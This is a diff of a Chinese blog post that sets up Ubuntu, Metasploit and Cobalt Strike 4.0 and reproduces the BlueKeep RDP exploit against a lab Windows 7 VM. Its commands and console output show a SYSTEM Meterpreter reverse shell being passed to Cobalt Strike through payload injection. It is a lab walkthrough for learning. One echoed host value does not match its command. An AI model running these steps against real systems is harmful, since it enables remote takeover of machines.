@@ -6,18 +6,28 @@
   <meta name="keywords" content=" 内网渗透 ">
   <meta name="description" content="内网渗透之平台搭建 | WLSMILE Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Ubuntu + Metasploit + CobaltStrike4.0内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。 Ubuntu 搭建">
+<meta name="description" content="Ubuntu + Metasploit + CobaltStrike4.0内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。 Ubuntu 搭建Ubuntu 18.04 http://mirrors.aliyun.com/ubuntu-releases/18.04/之后在VMware中创建之后启动起来，设置用户名密码完成。配置一下">
 <meta name="keywords" content="内网渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网渗透之平台搭建">
 <meta property="og:url" content="https://luckdogiii.github.io/2020/09/29/12/index.html">
 <meta property="og:site_name" content="WLSMILE Blog">
-<meta property="og:description" content="Ubuntu + Metasploit + CobaltStrike4.0内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。 Ubuntu 搭建">
+<meta property="og:description" content="Ubuntu + Metasploit + CobaltStrike4.0内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。 Ubuntu 搭建Ubuntu 18.04 http://mirrors.aliyun.com/ubuntu-releases/18.04/之后在VMware中创建之后启动起来，设置用户名密码完成。配置一下">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-09-30T02:19:44.421Z">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/1.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/2.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/3.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/4.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/5.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/6.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/7.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/8.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/12/9.png">
+<meta property="og:updated_time" content="2020-09-30T04:08:56.654Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网渗透之平台搭建">
-<meta name="twitter:description" content="Ubuntu + Metasploit + CobaltStrike4.0内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。 Ubuntu 搭建">
+<meta name="twitter:description" content="Ubuntu + Metasploit + CobaltStrike4.0内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。 Ubuntu 搭建Ubuntu 18.04 http://mirrors.aliyun.com/ubuntu-releases/18.04/之后在VMware中创建之后启动起来，设置用户名密码完成。配置一下">
+<meta name="twitter:image" content="https://luckdogiii.github.io/images/12/1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -418,7 +428,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-09-30 10:19:44'>2020-09-29 18:46</time>
+            Created At : <time class="date" title='Updated At: 2020-09-30 12:08:56'>2020-09-29 18:46</time>
         
     </div>
     <div class="article-meta">
@@ -440,7 +450,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ubuntu-Metasploit-CobaltStrike4-0"><span class="toc-text">Ubuntu + Metasploit + CobaltStrike4.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ubuntu-搭建"><span class="toc-text">Ubuntu 搭建</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ubuntu-Metasploit-CobaltStrike4-0"><span class="toc-text">Ubuntu + Metasploit + CobaltStrike4.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ubuntu-搭建"><span class="toc-text">Ubuntu 搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ⅰ-使用root登陆"><span class="toc-text">Ⅰ 使用root登陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ⅱ-安装SSH服务"><span class="toc-text">Ⅱ 安装SSH服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ⅲ-SSH开启ROOT登陆"><span class="toc-text">Ⅲ SSH开启ROOT登陆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-搭建"><span class="toc-text">Metasploit 搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CobaltStrike4-0-搭建"><span class="toc-text">CobaltStrike4.0 搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小试牛刀-msf与cs互传shell"><span class="toc-text">小试牛刀 msf与cs互传shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#复现-cve-2019-0708-bluekeep-rce"><span class="toc-text">复现 cve_2019_0708_bluekeep_rce</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -457,7 +467,123 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="Ubuntu-Metasploit-CobaltStrike4-0"><a href="#Ubuntu-Metasploit-CobaltStrike4-0" class="headerlink" title="Ubuntu + Metasploit + CobaltStrike4.0"></a>Ubuntu + Metasploit + CobaltStrike4.0</h1><p>内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。</p>
-<h2 id="Ubuntu-搭建"><a href="#Ubuntu-搭建" class="headerlink" title="Ubuntu 搭建"></a>Ubuntu 搭建</h2>
+<h2 id="Ubuntu-搭建"><a href="#Ubuntu-搭建" class="headerlink" title="Ubuntu 搭建"></a>Ubuntu 搭建</h2><p>Ubuntu 18.04 <a href="http://mirrors.aliyun.com/ubuntu-releases/18.04/" target="_blank" rel="noopener">http://mirrors.aliyun.com/ubuntu-releases/18.04/</a><br>之后在VMware中创建之后启动起来，设置用户名密码完成。配置一下以下几点平时使用更方便：</p>
+<h3 id="Ⅰ-使用root登陆"><a href="#Ⅰ-使用root登陆" class="headerlink" title="Ⅰ 使用root登陆"></a>Ⅰ 使用root登陆</h3><pre><code>sudo passwd root
+设置密码
+重复密码</code></pre><p>使用root进行登录</p>
+<h3 id="Ⅱ-安装SSH服务"><a href="#Ⅱ-安装SSH服务" class="headerlink" title="Ⅱ 安装SSH服务"></a>Ⅱ 安装SSH服务</h3><pre><code>sudo apt install openssh-server
+sudo service ssh start
+sudo apt install openssh-client</code></pre><h3 id="Ⅲ-SSH开启ROOT登陆"><a href="#Ⅲ-SSH开启ROOT登陆" class="headerlink" title="Ⅲ SSH开启ROOT登陆"></a>Ⅲ SSH开启ROOT登陆</h3><pre><code>vim /etc/ssh/sshd_config
+添加或修改 PermitRootLogin yes</code></pre><p><img src="/images/12/1.png" alt></p>
+<p>最后SSH使用ROOT登陆<br><img src="/images/12/2.png" alt></p>
+<h2 id="Metasploit-搭建"><a href="#Metasploit-搭建" class="headerlink" title="Metasploit 搭建"></a>Metasploit 搭建</h2><p>在根目录创建msf文件进入后执行</p>
+<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</code></pre><p>安装后<code>msfconsole</code>进入</p>
+<p><img src="/images/12/3.png" alt></p>
+<p>简单无脑，直接进入。</p>
+<h2 id="CobaltStrike4-0-搭建"><a href="#CobaltStrike4-0-搭建" class="headerlink" title="CobaltStrike4.0 搭建"></a>CobaltStrike4.0 搭建</h2><p>将CobaltStrike4.0.zip文件夹复制到/cs4/下后执行</p>
+<pre><code>unzip CobaltStrike4.0.zip
+cd CobaltStrike4.0/
+./teamserver 192.168.27.47 wlsmile123..
+
+# ./teamserver 本地IP 密码</code></pre><p><img src="/images/12/4.png" alt></p>
+<p>在本地windows打cs客户端，输入用户名密码。</p>
+<p><img src="/images/12/5.png" alt></p>
+<p>连接。<br><img src="/images/12/6.png" alt></p>
+<h1 id="小试牛刀-msf与cs互传shell"><a href="#小试牛刀-msf与cs互传shell" class="headerlink" title="小试牛刀 msf与cs互传shell"></a>小试牛刀 msf与cs互传shell</h1><h2 id="复现-cve-2019-0708-bluekeep-rce"><a href="#复现-cve-2019-0708-bluekeep-rce" class="headerlink" title="复现 cve_2019_0708_bluekeep_rce"></a>复现 cve_2019_0708_bluekeep_rce</h2><p>靶机：192.168.27.46 win7<br>本机：192.168.27.47 Ubuntu</p>
+<p>启动msf后搜索0708</p>
+<pre><code>msf6 &gt; search 0708
+
+Matching Modules
+================
+
+   #  Name                                             Disclosure Date  Rank    Check  Description
+   -  ----                                             ---------------  ----    -----  -----------
+   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep     2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
+   1  exploit/windows/browser/clear_quest_cqole        2012-05-19       normal  No     IBM Rational ClearQuest CQOle Remote Code Execution
+   2  exploit/windows/browser/tumbleweed_filetransfer  2008-04-07       great   No     Tumbleweed FileTransfer vcst_eu.dll ActiveX Control Buffer Overflow
+   3  exploit/windows/rdp/cve_2019_0708_bluekeep_rce   2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+msf6 &gt;</code></pre><p>进入cve_2019_0708_bluekeep_rce模块</p>
+<pre><code>msf6 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; options
+
+Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
+   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random
+   RDP_DOMAIN                        no        The client domain name to report during connect
+   RDP_USER                          no        The username to report during connect, UNSET = random
+   RHOSTS                            yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT            3389             yes       The target port (TCP)
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     192.168.27.47    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic targeting via fingerprinting</code></pre><p>将require项填写</p>
+<pre><code>msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.27.46
+rhosts =&gt; 192.168.27.47
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 1
+target =&gt; 1
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;</code></pre><p>执行拿shell</p>
+<pre><code>msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit                                                               
+
+[*] Started reverse TCP handler on 192.168.27.47:4444                                                                        
+[*] 192.168.27.46:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check                                         
+[+] 192.168.27.46:3389    - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel. 
+[*] 192.168.27.46:3389    - Scanned 1 of 1 hosts (100% complete)                                                             
+[*] 192.168.27.46:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count 1.      
+[!] 192.168.27.46:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;                                        
+[*] 192.168.27.46:3389 - Surfing channels ...                                                                                
+[*] 192.168.27.46:3389 - Lobbing eggs ...                                                                                    
+[*] 192.168.27.46:3389 - Forcing the USE of FREE&#39;d object ...                                                                
+[!] 192.168.27.46:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;                                         
+[*] Sending stage (200262 bytes) to 192.168.27.46                                                                            
+[*] Meterpreter session 1 opened (192.168.27.47:4444 -&gt; 192.168.27.46:60606) at 2020-09-30 11:54:51 +0800                    
+
+meterpreter &gt; getuid                                                                                                         
+Server username: NT AUTHORITY\SYSTEM                                                                                         
+meterpreter &gt;                                                                                                                </code></pre><p><code>background</code>进入后台</p>
+<p>cs建立一个监听<br><img src="/images/12/7.png" alt><br><img src="/images/12/8.png" alt></p>
+<p>msf使用exploit/windows/local/payload_inject模块</p>
+<pre><code>msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; use exploit/windows/local/payload_inject
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/payload_inject) &gt; set payload windows/
+Display all 245 possibilities? (y or n)
+msf6 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_http
+payload =&gt; windows/meterpreter/reverse_http
+msf6 exploit(windows/local/payload_inject) &gt; set DisablePayloadHandler true
+DisablePayloadHandler =&gt; true
+msf6 exploit(windows/local/payload_inject) &gt; set lhost 192.168.27.47
+lhost =&gt; 192.168.27.47
+msf6 exploit(windows/local/payload_inject) &gt; set lport 8888
+lport =&gt; 8888
+msf6 exploit(windows/local/payload_inject) &gt; set session 1
+session =&gt; 1
+msf6 exploit(windows/local/payload_inject) &gt; exploit
+
+[*] Running module against WLSMILE-PC
+[*] Spawned Notepad process 5056
+[*] Injecting payload into 5056
+[*] Preparing &#39;windows/meterpreter/reverse_http&#39; for PID 5056</code></pre><p><img src="/images/12/9.png" alt></p>
+<p>传递shell成功</p>
+
       
        
     </div>
